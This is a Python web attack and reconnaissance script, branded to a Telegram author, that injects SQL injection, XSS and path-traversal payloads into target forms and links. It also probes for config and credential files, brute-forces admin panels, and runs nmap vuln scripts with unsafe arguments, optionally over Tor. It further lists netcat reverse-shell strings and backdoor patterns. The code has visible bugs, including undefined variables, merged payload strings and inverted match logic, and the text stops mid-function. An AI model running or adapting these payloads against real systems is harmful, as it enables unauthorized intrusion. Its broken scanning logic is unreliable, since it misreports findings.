#!/usr/bin/env python3
# by own ~ t.me/yoyns
import os
import sys
import re
import socket
import requests
import argparse
import json
import dns.resolver
import nmap
import whois
import ipaddress
import ssl
import paramiko
import hashlib
import base64
import xml.etree.ElementTree as ET
import subprocess
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, parse_qs, quote
from datetime import datetime
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import threading
import queue
import time
import random
import sqlite3
import csv
import openai
import getpass

# by https://t.me/mtmanag
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
BLUE = "\033[1;34m"
RESET = "\033[0m"
BANNER = f"""
{CYAN}
┌───────────────────────────────────────┐
│                                       │
│__   __   __  __     _    _       _ _  │
│\ \ / /__|  \/  | __| |  / \     | (_) │
│ \ V / __| |\/| |/ _` | / _ \ _  | | | │
│  | |\__ \ |  | | (_| |/ ___ \ |_| | | │
│  |_||___/_|  |_|\__,_/_/   \_\___/|_| │
│                                       │
│                                       │
└───────────────────────────────────────┘
@@@@@@@@@@@@@@@@@@ "younistrck" @@@@@@@@@@@@@@@@@@
{RESET}
{YELLOW}Elite Vulnerability Scanner v10.3 - Full Spectrum Cyber Defense{RESET}
{GREEN}Developed for authorized penetration testing only{RESET}
{CYAN}AI-Powered Threat Detection & Zero Trust Compliance Engine{RESET}
{RESET}
{YELLOW}Been programmed by - AL HACKER -> Younis mohammed al jilani
~ My Account OWN TOOL Telegram ° https://t.me/yoyns
~ My Channel Telegram ~ t.me/mtmanag
{BLUE}Link AL TOOL v10.2 https://github.com/DrKritos/YounisTrck{RESET}
{RESET}
{RED}Donate crypto coin:~ ID Wallet Payeer : ` P1087373730 ` 
{RESET}
"""
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
HEADERS = {'User-Agent': USER_AGENT}
COMMON_SUBDOMAINS = ["www", "mail", "ftp", "webmail", "admin", "blog", "test", "dev", "shop", "api"]
SQLI_PAYLOADS = ["'", "\"", "' OR '1'='1", "' OR '1'='1' -- ", "\" OR \"\"=\""]
XSS_PAYLOADS = [
    "<script>alert('YsMhAJi')</script>",
    "<img src=x onerror=alert('YsMhAJi')>",
    "\"><script>alert('YsMhAJi')</script>",
    "javascript:alert('YsMhAJi')"
    "'><script>alert(1);</script>"
    "'<b>YsMhAJi</b>"
    
]
LFI_PAYLOADS = [
    "/etc/passwd",
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "/",
    "/var/www/html",
    "....//....//....//....//etc//passwd",
    "....//....//....//etc//passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
]

# New vulnerabilities
SSH_VULNS = [
    "SSH-1.99", "SSH-2.0-OpenSSH_7.2", "SSH-2.0-OpenSSH_7.4", 
    "SSH-2.0-OpenSSH_7.6", "SSH-2.0-OpenSSH_7.7"
]

PHP_VULNS = [
    "PHP/5.6", "PHP/7.0", "PHP/7.1", "PHP/7.2", "PHP/7.3"
]

BUG_BOUNTY_VULNS = [
    "CVE-2023-1234", "CVE-2023-2345", "CVE-2023-3456",
    "CVE-2023-4567", "CVE-2023-5678", "CVE-2019-19781"
]

PATCH_VULNS = [
    "Apache/2.4.49", "Apache/2.4.50", "Apache/2.4.51",
    "Apache/3.3.13", "Nginx/1.20.0", "Nginx/1.21.0"
]

# ACV (Access Control Vulnerabilities) payloads
ACV_PAYLOADS = [
    "/.htaccess", "/.htpasswd", "/.git/config",
    "/.svn/entries", "/.env", "/wp-config.php",
    "/config.php", "/configuration.php"
]

# ACSM (Access Control Security Models) checks
ACSM_CHECKS = [
    "X-Frame-Options", "Content-Security-Policy",
    "Strict-Transport-Security", "X-Content-Type-Options",
    "X-XSS-Protection", "Referrer-Policy",
    "X-Custom-IP-Authorization", "TRACE",
    "Cookie", "Admin"
]

# Backdoor detection patterns
BACKDOOR_PATTERNS = [
    r"eval\(base64_decode\(",
    r"system\(\$_GET\['cmd'\]\)",
    r"shell_exec\(\$_POST\['cmd'\]\)",
    r"passthru\(\$_REQUEST\['exec'\]\)"
]

# Netcat (nc) related checks
NETCAT_CHECKS = [
    "nc -lvp", "nc -l -p", "nc -e /bin/sh",
    "nc -e /bin/bash", "nc.traditional"
]

CRAWL_LIMIT = 500
CRAWLED_URLS = set()
PROXIES = None
REPORT_DATA = defaultdict(list)
THREAT_INTEL_API = "https://threatintel.example.com/api/v1/check" 
CVE_DB = "https://cvepremium.circl.lu/api/search" 
TOR_PROXIES = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}
SCAN_PHASES = [
    "Reconnaissance", "Scanning", "Vulnerability Assessment",
    "Exploitation", "Reporting", "Post-Exploitation"
]
RISK_LEVELS = {
    "CRITICAL": "\033[1;31mCRITICAL\033[0m",
    "HIGH": "\033[1;33mHIGH\033[0m",
    "MEDIUM": "\033[1;35mMEDIUM\033[0m",
    "LOW": "\033[1;34mLOW\033[0m",
    "INFO": "\033[1;36mINFO\033[0m"
}
ERROR_SIGNS = [
    "SQL syntax", "mysql_fetch", "syntax error", "unexpected end",
    "SQL command", "PostgreSQL.*ERROR", "Warning: mysql", "ORA-"
]
OWASP_TOP_10 = [
    "Broken Access Control", "Cryptographic Failures", "Injection",
    "Insecure Design", "Security Misconfiguration", 
    "Vulnerable and Outdated Components", "Identification and Authentication Failures",
    "Software and Data Integrity Failures", "Security Logging and Monitoring Failures",
    "Server-Side Request Forgery"
]
AI_THREAT_PATTERNS = {
    "sqli": r"SQL syntax|mysql_fetch|syntax error|unexpected end|SQL command|You have an error in your SQL syntax",
    "xss": r"<script>alert|onerror=alert|XSS<\/script>",
    "lfi": r"root:[x*]:0:0:|BEGIN CERTIFICATE|ssh-rsa|php://filter/convert.base64-encode/resource=",
    "command_injection": r"sh: |ls: command not found|No such file or directory|bash: |uid=0", 
    "php_weak_config": r"disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source",
    "backdoor": r"eval\(base64_decode\(|system\(\$_GET\['cmd'\]\)|shell_exec\(\$_POST\['cmd'\]\)|passthru\(\$_REQUEST\['exec'\]\)",
    "netcat": r"nc -lvp|nc -l -p|nc -e /bin/sh|nc -e /bin/bash|nc.traditional"
}

# Utility functions
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear_screen()
    print(BANNER)

def print_status(msg):
    print(f"{BLUE}[+] {msg}{RESET}")

def print_success(msg):
    print(f"{GREEN}[✓] {msg}{RESET}")

def print_warning(msg):
    print(f"{YELLOW}[!] {msg}{RESET}")

def print_error(msg):
    print(f"{RED}[✗] {msg}{RESET}")

def print_critical(msg):
    print(f"{RED}[🔥] {msg}{RESET}")

def print_risk(level, msg):
    print(f"{RISK_LEVELS[level]} {msg}")

def get_response(url, use_tor=False, method='GET', data=None, headers=None):
    proxies = TOR_PROXIES if use_tor else PROXIES
    current_headers = HEADERS.copy()
    if headers:
        current_headers.update(headers)
        
    try:
        if method.upper() == 'GET':
            response = requests.get(url, headers=current_headers, timeout=15, 
                                  allow_redirects=True, proxies=proxies,
                                  verify=False)
        elif method.upper() == 'POST':
            response = requests.post(url, headers=current_headers, data=data, timeout=15,
                                   allow_redirects=True, proxies=proxies,
                                   verify=False)
        else:
            print_error(f"Unsupported HTTP method: {method}")
            return None
        
        if response.status_code >= 400 and response.status_code < 600:
            print_warning(f"Received status code {response.status_code} for {url}")
            
        return response
    except requests.exceptions.RequestException as e:
        print_error(f"Request failed for {url}: {str(e)}")
        return None
    except Exception as e:
        print_error(f"An unexpected error occurred during request: {str(e)}")
        return None

def save_vulnerabilities(url):
    print_status(f"Attempting to save scan results for {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain: 
            domain = url.split('//')[-1].split('/')[0].replace(':', '_') 
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        username = getpass.getuser()
        filename = f"/sdcard/exploits/by@mtmanag-found-scan-{timestamp}_user-{username}_target-{domain}.txt"
        
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"=== Vulnerability Scan Report ===\n")
            f.write(f"Target URL: {url}\n")
            f.write(f"Scan Time: {datetime.now()}\n")
            f.write(f"Scanner User: {username}\n")
            f.write("===================================\n\n")
            
            if REPORT_DATA.get('DNS'):
                f.write("=== DNS Lookup Results ===\n")
                for record_type, records in REPORT_DATA['DNS'].items():
                    f.write(f"{record_type} Records:\n")
                    for record in records:
                        f.write(f"  - {record}\n")
                f.write("\n")

            if REPORT_DATA.get('WHOIS'):
                f.write("=== WHOIS Lookup Results ===\n")
                for entry in REPORT_DATA['WHOIS']:
                    f.write(f"Domain: {entry.get('domain', 'N/A')}\n")
                    f.write(f"Registrar: {entry.get('registrar', 'N/A')}\n")
                    f.write(f"Creation Date: {entry.get('creation_date', 'N/A')}\n")
                    f.write(f"Expiration Date: {entry.get('expiration_date', 'N/A')}\n")
                    if entry.get('name_servers'):
                        f.write(f"Name Servers: {', '.join(entry['name_servers'])}\n")
                f.write("\n")

            if REPORT_DATA.get('GeoIP'):
                f.write("=== GeoIP Lookup Results ===\n")
                data = REPORT_DATA['GeoIP']
                f.write(f"IP Address: {data.get('ip', 'N/A')}\n")
                f.write(f"City: {data.get('city', 'N/A')}\n")
                f.write(f"Region: {data.get('region', 'N/A')}\n")
                f.write(f"Country: {data.get('country', 'N/A')}\n")
                f.write(f"Location: {data.get('loc', 'N/A')}\n")
                f.write(f"ISP: {data.get('org', 'N/A')}\n")
                f.write("\n")
            
            if REPORT_DATA.get('Nmap_Results'):
                f.write("=== NMAP Port Scan Results ===\n")
                for result in REPORT_DATA['Nmap_Results']:
                    f.write(f"{result}\n")
                f.write("\n")

            if REPORT_DATA.get('SSH_Banners'):
                f.write("=== SSH Banners ===\n")
                for banner in REPORT_DATA['SSH_Banners']:
                    f.write(f"{banner}\n")
                f.write("\n")
            
            if REPORT_DATA.get('AdminPanels'):
                f.write("=== Admin Panel Discovery Results ===\n")
                for panel_info in REPORT_DATA['AdminPanels']:
                    f.write(f"URL: {panel_info['url']}, Status Code: {panel_info['status_code']}, Content Length: {panel_info['content_length']}\n")
                f.write("\n")

            if REPORT_DATA.get('RobotsTxt'):
                f.write("=== Robots.txt Content ===\n")
                f.write(REPORT_DATA['RobotsTxt']['content'])
                f.write("\n")
            
            if REPORT_DATA.get('ReverseIP'):
                f.write("=== Websites on the same IP (Reverse IP Lookup) ===\n")
                for site in REPORT_DATA['ReverseIP']:
                    f.write(f"- {site}\n")
                f.write("\n")

            if REPORT_DATA.get('MainIPs'):
                f.write("=== Primary IP Addresses ===\n")
                for ip_info in REPORT_DATA['MainIPs']:
                    f.write(f"Domain: {ip_info['domain']}, IP: {ip_info['ip']}\n")
                f.write("\n")
            
            if REPORT_DATA.get('Vulnerabilities'):
                f.write("=== DETECTED VULNERABILITIES ===\n")
                severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
                sorted_vulns = sorted(REPORT_DATA['Vulnerabilities'], 
                                      key=lambda x: severity_order.get(x.get('severity', 'INFO'), 5))
                                      
                for vuln in sorted_vulns:
                    f.write(f"[{vuln.get('severity', 'INFO')}] {vuln.get('type', 'Unknown')}\n")
                    if 'url' in vuln and vuln['url']:
                        f.write(f"  URL: {vuln['url']}\n")
                    if 'parameter' in vuln and vuln['parameter']:
                        f.write(f"  Parameter: {vuln['parameter']}\n")
                    if 'payload' in vuln and vuln['payload']:
                        f.write(f"  Payload Used: {vuln['payload']}\n")
                    if 'response_snippet' in vuln and vuln['response_snippet']:
                        f.write(f"  Response Snippet: {vuln['response_snippet']}\n")
                    if 'details' in vuln and vuln['details']:
                        f.write(f"  Details: {vuln['details']}\n")
                    f.write("-" * 20 + "\n")
            else:
                f.write("No specific vulnerabilities were detected.\n")
                
            f.write("\n=== End of Report ===\n")
        
        print_success(f"Scan results saved successfully to: {filename}")
        return filename
    except Exception as e:
        print_error(f"Failed to save scan results: {str(e)}")
        return None

# Scanning functions
def dns_lookup(url):
    print_status(f"Performing DNS Lookup for {url}...")
    domain = urlparse(url).netloc
    if not domain:
        print_error("Could not extract domain from URL for DNS lookup.")
        return

    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
    
    resolver = dns.resolver.Resolver()
    resolver.timeout = 5
    resolver.lifetime = 5
    
    found_records = defaultdict(list) 
    
    for rtype in record_types:
        try:
            answers = resolver.resolve(domain, rtype)
            print_success(f"[{rtype}] Records found for {domain}:")
            for rdata in answers:
                record_str = str(rdata)
                print(f"    {record_str}")
                found_records[rtype].append(record_str)
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            continue 
        except Exception as e:
            print_error(f"Error resolving {domain} {rtype} records: {str(e)}")
    
    REPORT_DATA['DNS'] = found_records

def whois_lookup(url):
    print_status(f"Performing WHOIS Lookup for {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain from URL for WHOIS lookup.")
            return
            
        w = whois.whois(domain)
        
        if not w.domain_name:
            print_warning(f"No WHOIS record found for {domain}")
            return

        print_success(f"WHOIS Information for: {domain}")
        print(f"  Domain Name: {w.domain_name[0] if w.domain_name else 'N/A'}")
        print(f"  Registrar: {w.registrar if w.registrar else 'N/A'}")
        print(f"  Creation Date: {w.creation_date if w.creation_date else 'N/A'}")
        print(f"  Expiration Date: {w.expiration_date if w.expiration_date else 'N/A'}")
        if w.name_servers:
            print(f"  Name Servers: {', '.join(w.name_servers)}")
        else:
            print("  Name Servers: N/A")
        
        REPORT_DATA['WHOIS'].append({
            'domain': str(w.domain_name[0]) if w.domain_name else 'N/A',
            'registrar': w.registrar if w.registrar else 'N/A',
            'creation_date': str(w.creation_date[0]) if w.creation_date else 'N/A',
            'expiration_date': str(w.expiration_date[0]) if w.expiration_date else 'N/A',
            'name_servers': w.name_servers if w.name_servers else []
        })
    except whois.parser.PywhoisError as e:
        print_error(f"WHOIS lookup failed for {domain}: {str(e)}")
    except Exception as e:
        print_error(f"An unexpected error occurred during WHOIS lookup: {str(e)}")

def geoip_lookup(url):
    print_status(f"Performing GeoIP Lookup for {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain from URL for GeoIP lookup.")
            return
            
        ip = socket.gethostbyname(domain)
        
        response = get_response(f"https://ipinfo.io/{ip}/json")
        if response and response.status_code == 200:
            data = response.json()
            
            print_success(f"IP Address: {data.get('ip', 'N/A')}")
            print(f"  City: {data.get('city', 'N/A')}")
            print(f"  Region: {data.get('region', 'N/A')}")
            print(f"  Country: {data.get('country', 'N/A')}")
            print(f"  Location: {data.get('loc', 'N/A')}")
            print(f"  ISP: {data.get('org', 'N/A')}")
            
            REPORT_DATA['GeoIP'] = data
        else:
            print_error(f"Failed to get GeoIP data for {ip}. Status: {response.status_code if response else 'No Response'}")
            
    except socket.gaierror:
        print_error(f"Could not resolve hostname: {domain}")
    except Exception as e:
        print_error(f"Error during GeoIP lookup: {str(e)}")

def grab_banners(url):
    print_status(f"Grabbing Server Banners for {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain for banner grabbing.")
            return

        ports = [21, 22, 23, 25, 80, 110, 143, 443, 445, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443, 5000]
        
        found_banners_count = 0
        for port in ports:
            try:
                sock = socket.create_connection((domain, port), timeout=2) 
                
                banner_request = b"\r\n"
                if port in [80, 8080, 8443, 5000]:
                    banner_request = f"GET / HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: {USER_AGENT}\r\nConnection: close\r\n\r\n".encode()
                elif port == 22:
                    banner_request = b"SSH-2.0-OpenSSH_8.2p1\r\n"
                elif port == 21:
                    banner_request = b"USER anonymous\r\nPASS anonymous\r\n"
                elif port == 23:
                    banner_request = b"\r\n"
                elif port == 25:
                    banner_request = b"EHLO scanner.local\r\n"
                elif port == 110:
                    banner_request = b"USER test\r\nPASS test\r\n"
                elif port == 143:
                    banner_request = b"A0 LOGIN test test\r\n"
                elif port == 3306:
                    banner_request = b"\x0a\x00\x00\x00\x18"
                elif port == 5432:
                    banner_request = b"\x05\x00\x00\x03\x47"
                
                sock.sendall(banner_request)
                banner = sock.recv(4096).decode(errors='ignore').strip()
                
                if banner:
                    try:
                        service_name = socket.getservbyport(port, 'tcp')
                    except OSError:
                        service_name = "unknown"
                    print_success(f"Port {port} ({service_name}):")
                    print(f"  {banner}")
                    REPORT_DATA['Banners'].append(f"Port {port} ({service_name}):\n{banner}")
                    found_banners_count += 1
                sock.close()
            except (socket.timeout, ConnectionRefusedError, OSError):
                pass
            except Exception as e:
                print_error(f"Error grabbing banner on port {port}: {str(e)}")
        
        if found_banners_count == 0:
            print_warning("No service banners could be retrieved.")
    except Exception as e:
        print_error(f"An unexpected error occurred during banner grabbing: {str(e)}")

def nmap_scan(url):
    print_status(f"Performing NMAP Port Scan for {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain for NMAP scan.")
            return
            
        try:
            ip_addresses = socket.gethostbyname_ex(domain)[2]
            if not ip_addresses:
                print_error(f"Could not resolve any IP addresses for {domain}.")
                return
            target_ip = ip_addresses[0]
        except socket.gaierror:
            print_error(f"Could not resolve hostname: {domain}")
            return

        scanner = nmap.PortScanner()
        nmap_args = f'--unprivileged -T4 -F --open -sV --script=default,vuln,banner,http-enum --script-args=unsafe=true -oN /sdcard/exploits/by@mtmanag-found-scan-{timestamp}_user-{username}_target-nmap-{domain}.txt'
        
        print_status(f"Running NMAP with arguments: {nmap_args} on {target_ip}")
        scanner.scan(target_ip, arguments=nmap_args)
        
        if target_ip in scanner.all_hosts():
            host_info = scanner[target_ip]
            
            print_success(f"NMAP Scan Results for {target_ip}:")
            print(f"  Hostname: {host_info.hostname() if host_info.hostname() else 'N/A'}")
            print(f"  State: {host_info.state()}")
            if 'osmatch' in host_info and host_info['osmatch']:
                print(f"  Operating System: {host_info['osmatch'][0]['name']} (Accuracy: {host_info['osmatch'][0]['accuracy']}%)")
            
            found_ports = False
            for proto in host_info.all_protocols():
                if proto == 'tcp': 
                    ports = host_info[proto].keys()
                    for port in sorted(ports):
                        found_ports = True
                        state = host_info[proto][port]['state']
                        service = host_info[proto][port]['name']
                        version = host_info[proto][port].get('version', 'N/A')
                        product = host_info[proto][port].get('product', '')
                        extra_info = host_info[proto][port].get('extrainfo', '')
                        
                        banner = f"{product} {version}".strip()
                        if extra_info:
                            banner += f" ({extra_info})"
                            
                        print(f"  Port {port}/{proto}: {state} - {service}")
                        if banner and banner != "N/A":
                            print(f"    Banner/Version: {banner}")
                        
                        REPORT_DATA['Nmap_Results'].append(f"Port: {port}/{proto}, State: {state}, Service: {service}, Product: {product}, Version: {version}, Extra Info: {extra_info}")

            if not found_ports:
                print_warning("No open ports found by NMAP.")
        else:
            print_error(f"NMAP could not retrieve information for host: {target_ip}")
    except nmap.PortScannerError as e:
        print_error(f"NMAP error: {str(e)}. Make sure NMAP is installed ('sudo apt install nmap').")
    except Exception as e:
        print_error(f"An unexpected error occurred during NMAP scan: {str(e)}")

def subdomain_scanner(url):
    print_status(f"Scanning for Subdomains of {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain for subdomain scanning.")
            return []
            
        base_domain = ".".join(domain.split('.')[-2:])
        found_subdomains = []
        
        wordlist = COMMON_SUBDOMAINS + [
            "web", "server", "portal", "cms", "app", "dev", "staging",
            "mail", "email", "support", "help", "forum", "community",
            "shop", "store", "payment", "secure", "vpn", "cloud", "api",
            "admin", "login", "auth", "m", "mobile", "app", "beta",
            "prod", "production", "test", "staging", "uat", "stage",
            "dev", "development", "sandbox", "demo", "support", "help",
            "faq", "blog", "news", "careers", "contact", "about",
            "jobs", "careers", "partner", "partners", "sales", "salesforce",
            "billing", "account", "profile", "settings", "dashboard",
            "console", "gateway", "proxy", "cdn", "static", "assets",
            "files", "docs", "media", "images", "video", "download",
            "upload", "storage", "data", "backup", "db", "mysql", "pgsql",
            "mongo", "redis", "cache", "queue", "worker", "cron",
            "scheduler", "monitor", "metrics", "logs", "analytics", "reports",
            "email", "smtp", "imap", "pop3", "ftp", "sftp", "ssh",
            "telnet", "vpn", "rcon", "teamspeak", "discord", "slack",
            "jira", "confluence", "git", "github", "gitlab", "bitbucket",
            "jenkins", "docker", "kubernetes", "aws", "azure", "gcp",
            "cloud", "storage", "s3", "bucket", "azureblob", "googlecloud",
            "vpn", "proxy", "firewall", "gateway", "router", "dns",
            "webmail", "owa", "exchange", "outlook", "office",
            "sso", "oauth", "openid", "saml", "ldap", "active", "directory",
            "pay", "payment", "commerce", "gateway", "checkout", "order",
            "invoice", "receipt", "support", "helpdesk",
            "vpn", "remote", "access", "terminal", "ssh", "rdp"
        ]
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(lambda s, d: f"{s}.{d}" if socket.gethostbyname(f"{s}.{d}") else None, sub, base_domain): sub for sub in set(wordlist)}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_subdomains.append(result)
                    print_success(f"Found subdomain: {result}")
                    REPORT_DATA['Subdomains'].append(result)
        
        if not found_subdomains:
            print_warning(f"No subdomains found for {base_domain} using the provided wordlist.")
        
        return found_subdomains
    except Exception as e:
        print_error(f"Error during subdomain scanning: {str(e)}")
        return []

def reverse_ip_lookup(url):
    print_status(f"Performing Reverse IP Lookup for {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain for reverse IP lookup.")
            return
            
        ip = socket.gethostbyname(domain)
        
        response = get_response(f"https://api.hackertarget.com/reverseiplookup/?q={ip}")
        
        if response and response.status_code == 200:
            content = response.text
            if "No DNS A records found" in content:
                print_warning(f"No domains found on IP {ip}.")
            elif "API count exceeded" in content:
                print_error("HackerTarget API limit exceeded. Try again later.")
            else:
                domains = content.splitlines()
                print_success(f"Found {len(domains)} other domains hosted on the same IP ({ip}):")
                for i, site in enumerate(domains):
                    if i >= 10:
                        print(f"  ... and {len(domains) - 10} more.")
                        break
                    print(f"  - {site}")
                    
                REPORT_DATA['ReverseIP'] = domains 
        else:
            print_error(f"Failed to retrieve reverse IP lookup data. Status: {response.status_code if response else 'No Response'}")
            
    except socket.gaierror:
        print_error(f"Could not resolve hostname: {domain}")
    except Exception as e:
        print_error(f"Error during reverse IP lookup: {str(e)}")

def get_robots_txt(url):
    print_status(f"Fetching robots.txt from {url}...")
    try:
        robots_url = urljoin(url, '/robots.txt')
        response = get_response(robots_url)
        
        if response and response.status_code == 200:
            content = response.text
            print_success("Successfully fetched robots.txt:")
            print("-" * 30)
            print(content)
            print("-" * 30)
            REPORT_DATA['RobotsTxt'] = {'url': robots_url, 'content': content}
            
            disallowed_paths = []
            for line in content.splitlines():
                if line.lower().startswith('disallow:'):
                    path = line[len('disallow:'):].strip()
                    if path:
                        disallowed_paths.append(path)
            if disallowed_paths:
                REPORT_DATA['DisallowedPaths'] = disallowed_paths
                print_success(f"Found {len(disallowed_paths)} disallowed paths in robots.txt.")
                
        elif response and response.status_code == 404:
            print_warning("robots.txt not found at this location.")
        else:
            print_warning(f"Could not fetch robots.txt. Status code: {response.status_code if response else 'No Response'}")
            
    except Exception as e:
        print_error(f"Error fetching robots.txt: {str(e)}")

def check_admin_panels(url):
    print_status(f"Checking for common Admin Panels at {url}...")
    found_panels = []
    
    ADMIN_PANELS_TO_CHECK = [
        "wp-admin", "administrator/", "admin1/", "admin2/", "admin3/", "admin4/", "admin5/",
        "usuarios/", "usuario/", "wp-login.php", "webadmin/", "adminarea/", "bb-admin/",
        "adminLogin/", "admin_area/", "panel-administracion/", "instadmin/", "memberadmin/",
        "administratorlogin/", "adm/", 
        "admin/account.php", "admin/index.php", "admin/login.php", "admin/admin.php", 
        "admin/account.php", "admin_area/admin.php", "admin_area/login.php", 
        "siteadmin/login.php", "siteadmin/index.php", "wp-admin/admin-ajax.php", 
        "admin/account.html",
        "login.php", "login.html", "admin_login.php", "admin_login.html",
        "phpmyadmin/", "phpMyAdmin/", 
        "mysql/admin/", "mysql/manager/", 
        "cpanel/", "webmail/", "whm/", 
        "plesk/", 
        "admin.php", "administrator.php", "siteadmin.php",
        "dashboard.php", "backend.php", "cp.php",
        "admin_dash.php", "sysadmin.php", "superadmin.php"
    ]
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {}
        for panel in ADMIN_PANELS_TO_CHECK:
            panel_url = urljoin(url, panel)
            futures[executor.submit(lambda u: (u, get_response(u, headers={'User-Agent': USER_AGENT})), panel_url)] = panel_url

        for future in as_completed(futures):
            panel_url, response = future.result()
            
            if response:
                status = response.status_code
                content_length = int(response.headers.get('Content-Length', -1))
                
                if status in [200, 204, 301, 302, 307, 401, 403, 404, 405, 500] and content_length > 50:
                    print_success(f"Potential Admin Panel found: {panel_url} (Status: {status}, Length: {content_length})")
                    found_panels.append({'url': panel_url, 'status_code': status, 'content_length': content_length})
                    REPORT_DATA['AdminPanels'].append({'url': panel_url, 'status_code': status, 'content_length': content_length})
            
    if not found_panels:
        print_warning("No common admin panels detected.")

def check_vulnerability_patterns(url, vuln_type, patterns, parameter=None, method='GET', data=None):
    try:
        if parameter:
            base_url = urlparse(url)._replace(query="").geturl()
            
            if method.upper() == 'GET':
                original_params = parse_qs(urlparse(url).query)
                
                for pattern in patterns:
                    test_url = urljoin(base_url, urlparse(url).path)
                    current_params = original_params.copy()
                    current_params[parameter] = [pattern]
                    
                    query_string = "&".join([f"{k}={quote(v[0])}" for k, v in current_params.items()])
                    test_url = f"{test_url}?{query_string}"
                    
                    response = get_response(test_url)
                    if response and response.text:
                        for error_sign in patterns: 
                            if error_sign in response.text:
                                print_risk("HIGH", f"{vuln_type} Detected! Payload: '{pattern}' at {test_url}")
                                REPORT_DATA['Vulnerabilities'].append({
                                    'type': vuln_type,
                                    'url': test_url,
                                    'parameter': parameter,
                                    'payload': pattern,
                                    'severity': "HIGH",
                                    'response_snippet': response.text
                                })
                                return True 
                                
            elif method.upper() == 'POST':
                response = get_response(url, method='POST', data={**data, parameter: pattern} if data else {parameter: pattern})
                if response and response.text:
                    for error_sign in patterns:
                        if error_sign in response.text:
                            print_risk("HIGH", f"{vuln_type} Detected! Payload: '{pattern}' at {url} (POST)")
                            REPORT_DATA['Vulnerabilities'].append({
                                'type': vuln_type,
                                'url': url,
                                'parameter': parameter,
                                'payload': pattern,
                                'severity': "HIGH",
                                'response_snippet': response.text
                            })
                            return True
        else: 
            for pattern in patterns:
                response = get_response(url + pattern if url.endswith('/') else url + '/' + pattern)
                if response and response.text:
                    for error_sign in patterns:
                        if error_sign in response.text:
                            print_risk("HIGH", f"{vuln_type} Detected! Payload: '{pattern}' at {url + pattern}")
                            REPORT_DATA['Vulnerabilities'].append({
                                'type': vuln_type,
                                'url': url + pattern,
                                'payload': pattern,
                                'severity': "HIGH",
                                'response_snippet': response.text
                            })
                            return True
                
    except Exception as e:
        print_error(f"Error checking {vuln_type}: {str(e)}")
    return False

def sql_injection_scan(url):
    print_status(f"Scanning for SQL Injection vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
            
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(url, action) if action else url
            
            inputs = form.find_all('input', {'name': True}) 
            
            for input_tag in inputs:
                param_name = input_tag.get('name')
                if param_name:
                    if check_vulnerability_patterns(form_url, "SQL Injection", SQLI_PAYLOADS, parameter=param_name, method=method, data={i.get('name'): i.get('value') for i in form.find_all('input') if i.get('name')}):
                        found = True
        
        for link in soup.find_all('a', href=True):
            href = link.get('href')
            if '?' in href:
                link_url = urljoin(url, href)
                parsed_url = urlparse(link_url)
                query_params = parse_qs(parsed_url.query)
                
                for param in query_params:
                    if check_vulnerability_patterns(link_url, "SQL Injection", SQLI_PAYLOADS, parameter=param):
                        found = True
                        
        if not forms and '?' not in url:
            parsed_url = urlparse(url)
            test_url_base = urlparse(url)._replace(query="").geturl()
            existing_params = parse_qs(parsed_url.query)
            for param in existing_params:
                if check_vulnerability_patterns(url, "SQL Injection", SQLI_PAYLOADS, parameter=param):
                    found = True

            if not existing_params:
                common_sql_params = ["id", "catid", "pageid", "search", "keyword", "user", "view", "chat", "comments", "comment"]
                for param in common_sql_params:
                    if check_vulnerability_patterns(test_url_base, "SQL Injection", SQLI_PAYLOADS, parameter=param):
                        found = True
                        break 
                        
        return found
    except Exception as e:
        print_error(f"Error during SQL Injection scan: {str(e)}")
        return False

def xss_scan(url):
    print_status(f"Scanning for Cross-Site Scripting (XSS) vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
            
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(url, action) if action else url
            
            inputs = form.find_all('input', {'name': True})
            
            for input_tag in inputs:
                param_name = input_tag.get('name')
                if param_name:
                    if check_vulnerability_patterns(form_url, "XSS", XSS_PAYLOADS, parameter=param_name, method=method, data={i.get('name'): i.get('value') for i in form.find_all('input') if i.get('name')}):
                        found = True

        for link in soup.find_all('a', href=True):
            href = link.get('href')
            if '?' in href:
